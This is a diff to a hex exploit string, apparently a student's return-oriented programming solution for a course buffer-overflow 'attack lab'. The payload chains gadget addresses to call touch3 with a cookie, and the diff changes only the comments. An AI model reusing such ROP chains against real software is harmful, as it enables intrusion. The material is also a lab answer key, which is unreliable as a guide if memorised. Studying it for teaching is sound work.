@@ -7,11 +7,11 @@
 d6 1a 40 00 00 00 00 00     /* return address2: 0x401ad6 */
 f4 1a 40 00 00 00 00 00     /* return address3: 0x401af4 */
 48 00 00 00 00 00 00 00     /* cookie offsets */
-26 1b 40 00 00 00 00 00     /* return address3: 0x401b26 */
-ac 1b 40 00 00 00 00 00     /* return address3: 0x401bac */
-b3 1b 40 00 00 00 00 00     /* return address3: 0x401bb3 */
-0a 1b 40 00 00 00 00 00     /* return address3: 0x401b0a */
-d6 1a 40 00 00 00 00 00     /* return address2: 0x401ad6 */
-32 1a 40 00 00 00 00 00     /* return address4: 0x401a32<touch3> */
+26 1b 40 00 00 00 00 00     /* return address4: 0x401b26 */
+ac 1b 40 00 00 00 00 00     /* return address5: 0x401bac */
+b3 1b 40 00 00 00 00 00     /* return address6: 0x401bb3 */
+0a 1b 40 00 00 00 00 00     /* return address: 0x401b0a */
+d6 1a 40 00 00 00 00 00     /* return address8: 0x401ad6 */
+32 1a 40 00 00 00 00 00     /* return address: 0x401a32<touch3> */
 34 63 39 32 61 65 36 38     /* cookie */
 00 00 00 00 00 00 00 00     /* cookie end flag(0x00) */
